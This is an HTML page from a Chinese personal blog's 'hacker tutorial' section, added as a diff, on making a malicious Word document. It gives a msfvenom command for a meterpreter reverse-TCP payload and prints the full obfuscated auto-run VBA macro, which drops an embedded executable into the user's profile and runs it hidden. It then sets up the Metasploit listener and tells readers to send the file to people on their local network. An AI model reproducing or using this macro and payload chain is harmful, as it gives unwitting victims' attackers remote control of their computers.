@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="Generator" content="EditPlus®">
+  <meta name="Author" content="">
+  <meta name="Keywords" content="">
+  <meta name="Description" content="">
+  <title>成宝博文-一个word文档入侵你电脑</title>
+    <!--引入基础库-->
+    <meta name='viewport' content='width=device-width,minimum-scale=1.0 maximum-scale=1.0 user-scalable=no' /> 
+ <!-- bootstrap基础文件 -->
+<link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
+   <!-- 结束 -->
+   <!-- 图片懒加载库 -->
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+  <script src="../js/publicjs.js"></script><!-- 公共js代码 -->
+  <link href="../css/publiccss.css" rel="stylesheet"><!-- 公共css代码 -->
+  <!-- 代码高亮库 -->
+  <script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>
+   <script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.0.3/languages/basic.min.js"></script>
+  <link href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.0.3/styles/vs2015.min.css" rel="stylesheet">
+  <!-- 妹子框架 -->
+   <!-- <script src="https://cdn.bootcdn.net/ajax/libs/amazeui/2.7.2/css/amazeui.min.css"></script>  -->
+  <!-- 结束 -->
+  <style>
+    	/*在超小屏幕下 手机 小于768px布局容器的宽度为100%*/
+	@media screen and (max-width: 767px){
+	        /*.img{width:100%;}*/
+	    }
+    /*小屏幕 平板电脑 大于等于768px 布局容器改为750px*/
+    	@media screen and (min-width: 768px){
+	      .lazy{height:500px;height:500px;} 
+	    }
+   /*中等屏幕 992px 布局容器改为970px*/
+       	@media screen and (min-width: 992px){
+	      .lazy{height:500px;height:500px;} 
+	    }
+       /*大屏幕 大于1200px 布局容器改为1170px*/
+	    @media screen and (min-width: 992px){
+	     .lazy{height:500px;height:500px}   .
+	  }
+  </style>
+ </head>
+ <body>
+        <!-- 顶部移动端PC端适配菜单栏 -->
+<nav class="navbar navbar-default" role="navigation">
+    <div class="container-fluid"> 
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse"
+                data-target="#example-navbar-collapse">
+            <span class="sr-only">切换导航</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="#">成宝个人网站</a>
+    </div>
+    <div class="collapse navbar-collapse" id="example-navbar-collapse">
+        <ul class="nav navbar-nav">
+            <li class="active"><a href="../index.html">首页</a></li>
+        </ul>
+    </div>
+    </div>
+</nav>
+ <!-- 菜单结束 -->
+ <!-- 选择主题 -->
+<div class="style-btn">
+<h4>选择主题</h4>
+<button type="button" class="btn btn-default de-style" onclick="green()">护眼绿</button>
+<button type="button" class="btn btn-default dark-style" onclick="dark()">暗黑模式</button>
+</div>
+<!-- 结束 -->
+<!-- 面包屑导航 -->
+<ul class="breadcrumb">
+    <li><a href="#">首页</a></li>
+    <li><a href="#">黑客教程</a></li>
+    <li class="active">一个word文档入侵你电脑</li>
+</ul>
+<!-- 面包屑提示结束 -->
+<!-- 正文 -->
+     <div class="container">
+	              <h1>office系列骚操作一个word文档入侵你电脑</h1>
+				  <!-- <img class="lazy" data-original="https://img.52z.com/upload/news/image/20200421/20200421121630_33367.jpg">  -->
+							<h3>1.第一步生成木马</h3>
+					         <h3>生成word木马</h3>
+					<h4>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -a x86 --platform windows -e x86/shikata_ga_nai -i 5 -f vba-exe<h4>
+<img class="lazy" data-original="img/ud.webp">
+	<a class = "look" href="img/ud.webp">查看高清大图</a>
+							<h3>然后在控制台会输出很多的代码然后:在宏代码里面添加类似这样的代码</h3>
+				    <pre>
+							<code>
+'**************************************************************
+'*
+'* This code is now split into two pieces:
+'*  1. The Macro. This must be copied into the Office document
+'*     macro editor. This macro will run on startup.
+'*
+'*  2. The Data. The hex dump at the end of this output must be
+'*     appended to the end of the document contents.
+'*
+'**************************************************************
+'*
+'* MACRO CODE
+'*
+'**************************************************************
+
+Sub Auto_Open()
+	Ukagp12
+End Sub
+
+Sub Ukagp12()
+	Dim Ukagp7 As Integer
+	Dim Ukagp1 As String
+	Dim Ukagp2 As String
+	Dim Ukagp3 As Integer
+	Dim Ukagp4 As Paragraph
+	Dim Ukagp8 As Integer
+	Dim Ukagp9 As Boolean
+	Dim Ukagp5 As Integer
+	Dim Ukagp11 As String
+	Dim Ukagp6 As Byte
+	Dim Jfxahjubvh as String
+	Jfxahjubvh = "Jfxahjubvh"
+	Ukagp1 = "JSdFNzaqwhBqIr.exe"
+	Ukagp2 = Environ("USERPROFILE")
+	ChDrive (Ukagp2)
+	ChDir (Ukagp2)
+	Ukagp3 = FreeFile()
+	Open Ukagp1 For Binary As Ukagp3
+	For Each Ukagp4 in ActiveDocument.Paragraphs
+		DoEvents
+			Ukagp11 = Ukagp4.Range.Text
+		If (Ukagp9 = True) Then
+			Ukagp8 = 1
+			While (Ukagp8 < Len(Ukagp11))
+				Ukagp6 = Mid(Ukagp11,Ukagp8,4)
+				Put #Ukagp3, , Ukagp6
+				Ukagp8 = Ukagp8 + 4
+			Wend
+		ElseIf (InStr(1,Ukagp11,Jfxahjubvh) > 0 And Len(Ukagp11) > 0) Then
+			Ukagp9 = True
+		End If
+	Next
+	Close #Ukagp3
+	Ukagp13(Ukagp1)
+End Sub
+
+Sub Ukagp13(Ukagp10 As String)
+	Dim Ukagp7 As Integer
+	Dim Ukagp2 As String
+	Ukagp2 = Environ("USERPROFILE")
+	ChDrive (Ukagp2)
+	ChDir (Ukagp2)
+	Ukagp7 = Shell(Ukagp10, vbHide)
+End Sub
+
+Sub AutoOpen()
+	Auto_Open
+End Sub
+
+Sub Workbook_Open()
+	Auto_Open
+End Sub
+
+'**************************************************************
+'*
+'* PAYLOAD DATA
+'*
+'**************************************************************
+							</code>
+					</pre>
+<h3>在文档里面输入类似这些内容</h3>
+<h4>Jfxahjubvh
+&H4D&H5A&H90&H00&H03&H00&H00&H</h4>
+	</div>
+<h3>一个带病毒木马的word文档就生成了然后就设置监听</h3>
+<h4>开始配置监听后门环境</h4>
+<h4>set playload windows/meterpreter/reverse_tcp</h4>
+<h4>use exploit/multi/handler</h4>
+<h4>set lhost 192.168.0.106</h4>
+<h4>set lport 4444</h4>
+<h4>run</h4>
+<h4>把文档发给和你同局域网的小伙伴让别人打开,别人word信任宏执行就会中招了</h4>
+   <!-- 正文结束 -->
+	 <!-- ----------------底部面板------------------------ -->
+ <div class="panel panel-success">
+    <div class="panel-heading">
+        <h3 class="panel-title">温馨提示</h3>
+    </div>
+    <div class="panel-body">
+         <p>欢迎收藏哦</p>
+		<strong>如有问题请联系作者微信:<span style="color:red;">HA2765441358</span></strong>
+    </div>
+</div>
+<!-------------- 面板结束--------------------------- -->
+ </body>
+ <script>hljs.initHighlightingOnLoad();</script><!--初始化显示-->
+ <script>
+	
+ </script>
+</html>
